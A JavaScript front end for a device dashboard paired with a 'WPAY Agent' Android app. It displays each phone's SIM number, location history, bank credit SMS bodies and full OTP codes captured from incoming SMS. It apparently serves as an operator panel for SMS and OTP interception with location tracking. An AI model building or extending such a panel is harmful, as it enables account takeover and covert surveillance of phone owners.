(function () {
  "use strict";
  const $ = id => document.getElementById(id);
  const createBtn = $("createPairingCode");
  const refreshBtn = $("refreshDevices");
  const refreshSelectedBtn = $("refreshSelectedDevice");
  const codeBox = $("pairingCode");
  const msg = $("deviceMsg");
  const grid = $("deviceGrid");
  const summary = $("deviceSummaryCard");
  const empty = $("deviceEmptyState");
  const eventsBody = $("deviceEventsBody");
  const otpEventsBody = $("otpEventsBody");
  const utrPanel = $("utrEventsPanel");
  const otpPanel = $("otpEventsPanel");
  const eventTitle = $("eventTitle");
  const eventDescription = $("eventDescription");
  const eventTabs = Array.from(document.querySelectorAll("[data-event-tab]"));
  if (!createBtn || !refreshBtn || !codeBox || !msg || !grid || !summary || !eventsBody || !otpEventsBody) return;

  let devices = [];
  let selectedId = "";
  let selectedDevice = null;
  let activeEventTab = "utr";
  let autoTimer = null;
  let refreshBusy = false;
  let detailBusy = false;
  let locationHistoryVisible = false;
  let locationHistoryBusy = false;
  let locationHistoryFilter = "all";
  let locationHistoryEvents = [];
  let lastLocationRefreshAt = 0;

  function showMessage(text, type = "muted") { msg.className = "msg " + type; msg.textContent = text; }
  function esc(value) { return String(value ?? "").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/\"/g,"&quot;").replace(/'/g,"&#039;"); }
  function when(value) { if (!value) return "—"; const d = new Date(value); return Number.isNaN(d.getTime()) ? String(value) : d.toLocaleString(); }
  function amount(value) { const n = Number(value); return Number.isFinite(n) ? n.toFixed(2) : "—"; }
  function online(value) { const t = new Date(value || 0).getTime(); return Number.isFinite(t) && Date.now() - t <= 2 * 60 * 1000; }
  function deviceName(d) { return [d?.manufacturer,d?.model].filter(Boolean).join(" ") || d?.id || "—"; }
  function redirectIfUnauthorized(response) { if (response && response.status === 401) { location.replace("/login"); return true; } return false; }

  function normalizePhone(value) { return String(value || "").replace(/\D/g, ""); }
  function identityKey(d) {
    const phone = normalizePhone(d?.phone_e164);
    if (phone) return "phone:" + phone;
    const sim = [d?.sim_subscription_label,d?.sim_carrier].filter(Boolean).join("|").trim().toLowerCase();
    if (sim) return "sim:" + sim;
    return "device:" + [d?.manufacturer,d?.model,d?.android_version].filter(Boolean).join("|").toLowerCase();
  }

  function dedupeDevices(raw) {
    const sorted = [...raw].sort((a,b) => new Date(b.last_seen_at || 0) - new Date(a.last_seen_at || 0));
    const groups = new Map();
    for (const d of sorted) {
      const key = identityKey(d);
      if (!groups.has(key)) groups.set(key, []);
      groups.get(key).push(d);
    }
    return Array.from(groups.values()).map(group => {
      const latest = group[0];
      return { ...latest, _aliasIds: group.map(x => x.id), _duplicateCount: group.length };
    });
  }

  function mergeEvents(chunks, timeField) {
    const map = new Map();
    for (const list of chunks) for (const item of list || []) {
      const key = [item.id,item.utr,item.sender,item.sms_received_at,item.created_at,item.message_masked,item.sms_body].join("|");
      if (!map.has(key)) map.set(key, item);
    }
    return Array.from(map.values()).sort((a,b) => new Date(b[timeField] || b.created_at || 0) - new Date(a[timeField] || a.created_at || 0));
  }

  async function refreshApkInfo() {
    const link = $("apkDownloadLink");
    const versionLabel = $("apkVersion");
    if (link) link.href = "/downloads/WPAY-Agent.apk?fresh=" + Date.now();
    try {
      const r = await fetch("/downloads/WPAY-Agent.json?fresh=" + Date.now(), { cache: "no-store" });
      if (!r.ok) return;
      const data = await r.json();
      const version = String(data.version || "").trim();
      const commit = String(data.commit || "").trim();
      if (versionLabel && version) versionLabel.textContent = "v" + version;
      if (link) link.href = "/downloads/WPAY-Agent.apk?v=" + encodeURIComponent(commit || version || Date.now());
    } catch { }
  }

  function ensureLogoutButton() {
    const side = document.querySelector(".side");
    if (!side || $("logoutDashboard")) return;
    const button = document.createElement("button");
    button.id = "logoutDashboard";
    button.type = "button";
    button.textContent = "Log out";
    button.style.cssText = "margin:18px 8px 0;width:calc(100% - 16px);border:1px solid #30415f;border-radius:12px;padding:11px 12px;background:#131d30;color:#dce6f6;font-weight:800;cursor:pointer";
    button.addEventListener("click", async () => {
      try { await fetch("/api/dashboard/logout", { method: "POST" }); } catch { }
      location.replace("/login");
    });
    side.appendChild(button);
  }

  function ensureLocationHistoryUi() {
    if ($("locationHistoryCard")) return $("locationHistoryCard");
    const selectedCard = summary.closest(".card");
    if (!selectedCard) return null;
    const card = document.createElement("div");
    card.id = "locationHistoryCard";
    card.className = "card";
    card.hidden = true;
    card.style.marginTop = "18px";
    card.innerHTML = `
      <div class="event-head">
        <div><div class="eyebrow">DEVICE LOCATION</div><h3 style="margin:4px 0 5px;font-size:23px">Location History</h3><div class="muted">Location-service changes, movement and periodic checkpoints from the selected paired device.</div></div>
        <button id="refreshLocationHistory" type="button" class="btn secondary">↻ Refresh</button>
      </div>
      <div id="locationHistorySummary" class="status-grid" style="margin-top:16px"></div>
      <div style="display:flex;gap:8px;flex-wrap:wrap;margin:12px 0">
        <button type="button" class="btn primary" data-location-filter="all">All</button>
        <button type="button" class="btn secondary" data-location-filter="movement">Movement</button>
        <button type="button" class="btn secondary" data-location-filter="state">ON / OFF</button>
      </div>
      <div class="table-wrap"><table class="txn-table" style="min-width:980px"><thead><tr><th>DATE / TIME</th><th>EVENT</th><th>LOCATION</th><th>ACCURACY</th><th>DISTANCE</th><th>STATUS</th></tr></thead><tbody id="locationHistoryBody"><tr><td colspan="6" class="muted">Loading location history...</td></tr></tbody></table></div>`;
    selectedCard.insertAdjacentElement("afterend", card);
    $("refreshLocationHistory").addEventListener("click", () => loadLocationHistory(false, true));
    card.querySelectorAll("[data-location-filter]").forEach(btn => btn.addEventListener("click", () => {
      locationHistoryFilter = btn.dataset.locationFilter || "all";
      card.querySelectorAll("[data-location-filter]").forEach(other => {
        other.classList.toggle("primary", other === btn);
        other.classList.toggle("secondary", other !== btn);
      });
      renderLocationHistory();
    }));
    return card;
  }

  function renderCards() {
    if (!devices.length) { grid.innerHTML = '<div class="muted">No Android device has been paired yet.</div>'; return; }
    grid.innerHTML = devices.map(d => {
      const isOnline = online(d.last_seen_at);
      const title = deviceName(d);
      return `<button class="device-card${d.id===selectedId?' selected':''}" data-device-id="${esc(d.id)}"><div class="device-card-head"><strong>${esc(title)}</strong><span class="state-pill ${isOnline?'online':'offline'}">${isOnline?'Online':'Offline'}</span></div><div class="device-card-meta">SIM: ${esc(d.phone_e164 || d.sim_subscription_label || d.sim_carrier || 'Unavailable')}</div><div class="device-card-meta">Battery: ${d.battery_level==null?'—':Math.round(Number(d.battery_level))+'%'}</div><div class="device-card-meta">Network: ${esc(d.network_type || '—')}</div><div class="device-card-meta">Last UTR: ${esc(d.last_utr || '—')}</div>${d._duplicateCount>1?`<div class="device-card-meta" style="color:#8f82b8">Previous pairings merged: ${d._duplicateCount}</div>`:''}</button>`;
    }).join("");
    grid.querySelectorAll("[data-device-id]").forEach(btn => btn.addEventListener("click", () => loadDevice(btn.dataset.deviceId, false)));
  }

  function renderSummary(d) {
    selectedDevice = d;
    empty.hidden = true; summary.hidden = false;
    const isOnline = online(d.last_seen_at);
    const loc = d.latitude==null || d.longitude==null ? "Unavailable" : `${Number(d.latitude).toFixed(6)}, ${Number(d.longitude).toFixed(6)}`;
    summary.innerHTML = `<div class="device-card-head"><div><strong>${esc(deviceName(d))}</strong><div class="muted small">${esc(d.id)}</div></div><span class="state-pill ${isOnline?'online':'offline'}">${isOnline?'Online':'Offline'}</span></div><div class="detail-grid"><div class="detail"><span>Location</span><strong>${esc(loc)}</strong><small>${d.location_accuracy==null?'Accuracy unavailable':'± '+esc(d.location_accuracy)+' m'}</small><button type="button" id="viewLocationHistory" class="btn secondary" style="margin-top:10px;padding:8px 10px">${locationHistoryVisible?'Hide':'View'} Location History</button></div><div class="detail"><span>SIM card / phone number</span><strong>${esc(d.phone_e164 || 'Not exposed by Android/device')}</strong><small>${esc(d.sim_carrier || d.network_carrier || 'Carrier unavailable')}</small></div><div class="detail"><span>Battery health</span><strong>${d.battery_level==null?'—':Math.round(Number(d.battery_level))+'%'}</strong><small>${d.charging?'Charging':'Not charging'}</small></div><div class="detail"><span>Connection network</span><strong>${esc(d.network_type || '—')}</strong><small>${esc(d.network_carrier || d.sim_carrier || '—')}</small></div><div class="detail"><span>Status</span><strong>${isOnline?'Online':'Offline'}</strong><small>Last seen ${esc(when(d.last_seen_at))}</small></div><div class="detail"><span>App / Android</span><strong>${esc(d.app_version || '—')}</strong><small>Android ${esc(d.android_version || '—')}</small></div></div>`;
    const historyButton = $("viewLocationHistory");
    if (historyButton) historyButton.addEventListener("click", async () => {
      const card = ensureLocationHistoryUi();
      if (!card) return;
      locationHistoryVisible = !locationHistoryVisible;
      card.hidden = !locationHistoryVisible;
      historyButton.textContent = `${locationHistoryVisible?'Hide':'View'} Location History`;
      if (locationHistoryVisible) await loadLocationHistory(false, true);
    });
  }

  function locationEventLabel(type) {
    return ({
      LOCATION_ON: "Location ON",
      LOCATION_OFF: "Location OFF",
      PERMISSION_GRANTED: "Permission granted",
      PERMISSION_REVOKED: "Permission revoked",
      MOVED: "Moved",
      CHECKPOINT: "Checkpoint"
    })[type] || type || "Location update";
  }

  function renderLocationHistory() {
    const card = ensureLocationHistoryUi();
    if (!card) return;
    const body = $("locationHistoryBody");
    const summaryBox = $("locationHistorySummary");
    const all = locationHistoryEvents;
    const current = all[0] || null;
    const today = new Date();
    const sameDay = value => { const d = new Date(value); return d.getFullYear()===today.getFullYear() && d.getMonth()===today.getMonth() && d.getDate()===today.getDate(); };
    const changesToday = all.filter(e => sameDay(e.captured_at) && e.event_type !== "CHECKPOINT").length;
    const lastMove = all.find(e => e.event_type === "MOVED");
    const currentLocation = current && current.latitude != null && current.longitude != null
      ? `${Number(current.latitude).toFixed(6)}, ${Number(current.longitude).toFixed(6)}`
      : "Unavailable";
    const serviceState = current ? (current.permission_granted ? (current.location_enabled ? "ON" : "OFF") : "Permission off") : "No history";
    summaryBox.innerHTML = `
      <div class="status"><span class="muted">Current location</span><strong style="font-size:14px">${esc(currentLocation)}</strong></div>
      <div class="status"><span class="muted">Location service</span><strong>${esc(serviceState)}</strong></div>
      <div class="status"><span class="muted">Changes today</span><strong>${changesToday}</strong></div>
      <div class="status"><span class="muted">Last movement</span><strong style="font-size:14px">${esc(lastMove ? when(lastMove.captured_at) : '—')}</strong></div>`;

    let filtered = all;
    if (locationHistoryFilter === "movement") filtered = all.filter(e => e.event_type === "MOVED");
    if (locationHistoryFilter === "state") filtered = all.filter(e => ["LOCATION_ON","LOCATION_OFF","PERMISSION_GRANTED","PERMISSION_REVOKED"].includes(e.event_type));
    if (!filtered.length) {
      body.innerHTML = '<tr><td colspan="6" class="muted">No matching location history yet.</td></tr>';
      return;
    }
    body.innerHTML = filtered.map(e => {
      const coords = e.latitude == null || e.longitude == null ? "Unavailable" : `${Number(e.latitude).toFixed(6)}, ${Number(e.longitude).toFixed(6)}`;
      const locationText = e.last_known ? `${coords} · last known` : coords;
      const status = e.permission_granted ? (e.location_enabled ? "Active" : "Location off") : "Permission off";
      return `<tr><td>${esc(when(e.captured_at))}</td><td><strong>${esc(locationEventLabel(e.event_type))}</strong></td><td>${esc(locationText)}</td><td>${e.accuracy==null?'—':'± '+esc(e.accuracy)+' m'}</td><td>${e.distance_meters==null?'—':esc(Number(e.distance_meters).toFixed(0))+' m'}</td><td>${esc(status)}</td></tr>`;
    }).join("");
  }

  async function loadLocationHistory(silent = false, force = false) {
    if (!selectedId || locationHistoryBusy) return;
    if (!force && silent && Date.now() - lastLocationRefreshAt < 15000) return;
    locationHistoryBusy = true;
    try {
      const group = devices.find(d => d.id === selectedId);
      const aliasIds = group?._aliasIds?.length ? group._aliasIds : [selectedId];
      const chunks = await Promise.all(aliasIds.map(async aliasId => {
        const response = await fetch(`/api/devices/admin/device/${encodeURIComponent(aliasId)}/location-history?limit=300`, { cache:"no-store" });
        if (redirectIfUnauthorized(response)) throw new Error("Dashboard login required");
        const data = await response.json();
        if (!response.ok) throw new Error(data.error || "Could not load location history");
        return (Array.isArray(data.events) ? data.events : []).map(event => ({ ...event, _deviceId: aliasId }));
      }));
      const merged = new Map();
      for (const list of chunks) for (const event of list) {
        const key = [event._deviceId,event.id,event.event_type,event.captured_at].join("|");
        if (!merged.has(key)) merged.set(key, event);
      }
      locationHistoryEvents = Array.from(merged.values()).sort((a,b) => new Date(b.captured_at || 0) - new Date(a.captured_at || 0));
      lastLocationRefreshAt = Date.now();
      renderLocationHistory();
    } catch (error) {
      if (!silent && error.message !== "Dashboard login required") showMessage(error.message, "err");
      const body = $("locationHistoryBody");
      if (body) body.innerHTML = `<tr><td colspan="6" class="err">${esc(error.message || 'Could not load location history')}</td></tr>`;
    } finally {
      locationHistoryBusy = false;
    }
  }

  function renderEvents(events) {
    if (!events.length) { eventsBody.innerHTML='<tr><td colspan="6" class="muted">No credit / UTR events yet.</td></tr>'; return; }
    eventsBody.innerHTML = events.map(e => `<tr><td>${esc(when(e.created_at || e.received_at))}</td><td>${esc(e.utr || '—')}</td><td>₹ ${esc(amount(e.amount))}</td><td>${esc(e.sender || '—')}</td><td>${esc(e.status || '—')}</td><td class="sms-cell">${esc(e.sms_body || '—')}</td></tr>`).join("");
  }

  function renderOtpEvents(events, phone, name) {
    if (!events.length) { otpEventsBody.innerHTML='<tr><td colspan="8" class="muted">No OTP detection events yet.</td></tr>'; return; }
    const deduped = [];
    for (const event of events) {
      const eventTime = new Date(event.sms_received_at || event.created_at || 0).getTime();
      const context = String(event.message_masked || "OTP detected")
        .replace(/\*+\d{2}|\[OTP\]|\b\d{4,8}\b/g, "[OTP]")
        .replace(/\s+/g, " ")
        .trim()
        .toLowerCase();
      const duplicate = deduped.find(existing => {
        const existingTime = new Date(existing.sms_received_at || existing.created_at || 0).getTime();
        return String(existing.sender || "") === String(event.sender || "") &&
          existing._otpContext === context &&
          Number.isFinite(eventTime) && Number.isFinite(existingTime) &&
          Math.abs(existingTime - eventTime) <= 10000;
      });
      if (!duplicate) {
        deduped.push({ ...event, _otpContext: context });
      } else if (!/^\d{4,8}$/.test(String(duplicate.otp_code || "")) && /^\d{4,8}$/.test(String(event.otp_code || ""))) {
        Object.assign(duplicate, event, { _otpContext: context });
      }
    }
    otpEventsBody.innerHTML = deduped.map(e => {
      const eventCode = e.otp_code || 'Unavailable';
      const details = e.message_masked || (Number(e.otp_length) ? `OTP detected (${Number(e.otp_length)} digits)` : 'OTP detected');
      return `<tr><td>${esc(when(e.sms_received_at || e.created_at))}</td><td class="otp-code">${esc(eventCode)}</td><td>${esc(e.sender || '—')}</td><td class="sms-cell">${esc(details)}</td><td class="mobile-full">${esc(phone || 'Unavailable')}</td><td>${esc(name)}</td><td>${esc(e.source || 'sms')}</td><td class="event-status">Received</td></tr>`;
    }).join("");
  }

  function setEventTab(tab) {
    activeEventTab = tab === "otp" ? "otp" : "utr";
    eventTabs.forEach(btn => btn.classList.toggle("active", btn.dataset.eventTab === activeEventTab));
    if (utrPanel) utrPanel.hidden = activeEventTab !== "utr";
    if (otpPanel) otpPanel.hidden = activeEventTab !== "otp";
    if (eventTitle) eventTitle.textContent = activeEventTab === "otp" ? "OTP Events" : "Credit / UTR Events";
    if (eventDescription) eventDescription.textContent = activeEventTab === "otp"
      ? "OTP detection events from the selected device with redacted SMS context."
      : "Bank credit messages received from the selected WPAY Agent device.";
  }

  async function createPairing() {
    createBtn.disabled = true; showMessage("Creating one-time pairing code...");
    try {
      const r = await fetch("/api/devices/admin/pairing-token", { method:"POST", headers:{"Content-Type":"application/json"}, body:"{}" });
      if (redirectIfUnauthorized(r)) return;
      const data = await r.json(); if (!r.ok) throw new Error(data.error || "Could not create pairing code");
      codeBox.textContent = data.pairingCode; codeBox.hidden = false; showMessage("Pairing code created. It expires in 10 minutes.", "ok");
    } catch (e) { codeBox.hidden = true; showMessage(e.message, "err"); } finally { createBtn.disabled = false; }
  }

  async function refreshDevices(autoSelect = false, silent = false) {
    if (refreshBusy) return;
    refreshBusy = true;
    if (!silent) { refreshBtn.disabled = true; showMessage("Loading connected devices..."); }
    try {
      const r = await fetch("/api/devices/admin/list", { cache:"no-store" });
      if (redirectIfUnauthorized(r)) return;
      const data = await r.json(); if (!r.ok) throw new Error(data.error || "Could not load devices");
      devices = dedupeDevices(Array.isArray(data.devices) ? data.devices : []);
      $("connectedCount").textContent = String(devices.length);
      $("lastUtr").textContent = devices.find(d=>d.last_utr)?.last_utr || "—";
      $("deviceHealth").textContent = devices.some(d=>online(d.last_seen_at)) ? "Online" : (devices.length ? "Offline" : "Not connected");
      if (selectedId && !devices.some(d => d.id === selectedId)) {
        const selectedPhone = normalizePhone(selectedDevice?.phone_e164);
        const replacement = selectedPhone ? devices.find(d => normalizePhone(d.phone_e164) === selectedPhone) : null;
        if (replacement) selectedId = replacement.id;
      }
      renderCards();
      if (selectedId && devices.some(d=>d.id===selectedId)) await loadDevice(selectedId, true);
      else if (autoSelect && devices.length) await loadDevice(devices[0].id, true);
      else if (!devices.length) {
        selectedDevice = null;
        locationHistoryVisible = false;
        locationHistoryEvents = [];
        const locationCard = $("locationHistoryCard");
        if (locationCard) locationCard.hidden = true;
        if (refreshSelectedBtn) refreshSelectedBtn.disabled = true;
        summary.hidden=true; empty.hidden=false;
        eventsBody.innerHTML='<tr><td colspan="6" class="muted">No connected device.</td></tr>';
        otpEventsBody.innerHTML='<tr><td colspan="8" class="muted">No connected device.</td></tr>';
      }
      if (!silent) showMessage("Device list updated.", "ok");
    } catch(e){ if (!silent) showMessage(e.message,"err"); }
    finally { refreshBusy = false; if (!silent) refreshBtn.disabled=false; }
  }

  async function loadDevice(id, silent = false) {
    if (detailBusy && silent) return;
    detailBusy = true;
    selectedId = id;
    const group = devices.find(d => d.id === id);
    const aliasIds = group?._aliasIds?.length ? group._aliasIds : [id];
    renderCards();
    if (!silent) showMessage("Loading device details...");
    if (refreshSelectedBtn && !silent) refreshSelectedBtn.disabled = true;
    try {
      const pairs = await Promise.all(aliasIds.map(async aliasId => {
        const [detailResponse, otpResponse] = await Promise.all([
          fetch(`/api/devices/admin/device/${encodeURIComponent(aliasId)}`,{cache:"no-store"}),
          fetch(`/api/devices/admin/device/${encodeURIComponent(aliasId)}/otp-events`,{cache:"no-store"})
        ]);
        if (redirectIfUnauthorized(detailResponse) || redirectIfUnauthorized(otpResponse)) throw new Error("Dashboard login required");
        const detailData = await detailResponse.json();
        const otpData = await otpResponse.json();
        if(!detailResponse.ok) throw new Error(detailData.error||"Could not load device details");
        if(!otpResponse.ok) throw new Error(otpData.error||"Could not load OTP events");
        return { detailData, otpData };
      }));

      const detailDevices = pairs.map(x => x.detailData.device || {}).sort((a,b) => new Date(b.last_seen_at || 0) - new Date(a.last_seen_at || 0));
      const latest = { ...(group || {}), ...(detailDevices[0] || {}) };
      renderSummary(latest);
      const creditEvents = mergeEvents(pairs.map(x => Array.isArray(x.detailData.events) ? x.detailData.events : []), "created_at");
      const otpEvents = mergeEvents(pairs.map(x => Array.isArray(x.otpData.events) ? x.otpData.events : []), "sms_received_at");
      renderEvents(creditEvents);
      renderOtpEvents(otpEvents, latest.phone_e164 || group?.phone_e164, deviceName(latest));
      if (locationHistoryVisible) {
        const historyCard = ensureLocationHistoryUi();
        if (historyCard) historyCard.hidden = false;
        await loadLocationHistory(true, false);
      }
      if (!silent) showMessage("Device details loaded.","ok");
    } catch(e){ if (!silent && e.message !== "Dashboard login required") showMessage(e.message,"err"); }
    finally { detailBusy = false; if (refreshSelectedBtn) refreshSelectedBtn.disabled = false; }
  }

  createBtn.addEventListener("click", createPairing);
  refreshBtn.addEventListener("click", () => refreshDevices(false, false));
  if (refreshSelectedBtn) refreshSelectedBtn.addEventListener("click", () => selectedId && loadDevice(selectedId, false));
  eventTabs.forEach(btn => btn.addEventListener("click", () => setEventTab(btn.dataset.eventTab)));
  setEventTab("utr");
  ensureLogoutButton();
  ensureLocationHistoryUi();
  refreshApkInfo();
  refreshDevices(true, false);
  autoTimer = setInterval(() => refreshDevices(false, true), 4000);
  window.addEventListener("beforeunload", () => { if (autoTimer) clearInterval(autoTimer); });
})();
